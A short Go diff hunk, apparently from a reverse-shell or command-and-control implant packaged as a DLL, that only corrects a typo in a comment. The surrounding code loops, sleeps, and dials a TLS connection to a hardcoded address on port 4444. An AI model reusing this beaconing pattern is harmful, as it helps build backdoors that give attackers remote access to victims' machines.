@@ -24,7 +24,7 @@ func Tacos() {
 		}
 		time.Sleep(15 * time.Second)
 
-		conn, err := tls.Dial("tcp", "172.23.110.155:4444", conf) //CHANGE IP, TODO: as a parameter for the dll fucntion
+		conn, err := tls.Dial("tcp", "172.23.110.155:4444", conf) //CHANGE IP, TODO: as a parameter for the dll function
 
 		if err != nil {
 			continue
